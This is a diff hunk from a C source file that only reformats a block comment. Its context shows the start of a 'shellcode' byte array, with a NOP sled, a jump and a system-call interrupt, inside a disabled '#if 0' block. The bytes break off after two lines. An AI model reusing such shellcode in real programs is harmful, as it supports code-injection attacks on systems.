@@ -13,8 +13,8 @@
 
 #if 0
 /* This it the below assembly code in binary form. It runs. To get it,
- * just compile the code below and use the debugger to dump the code
- * in the main function. */
+  just compile the code below and use the debugger to dump the code
+  in the main function. */
 char shellcode[] =
   "\x90\x90\x90\x90\x90\xe9\x0b\x00"
   "\x00\x00\x6a\x02\xcd\x30\x31\xc0"
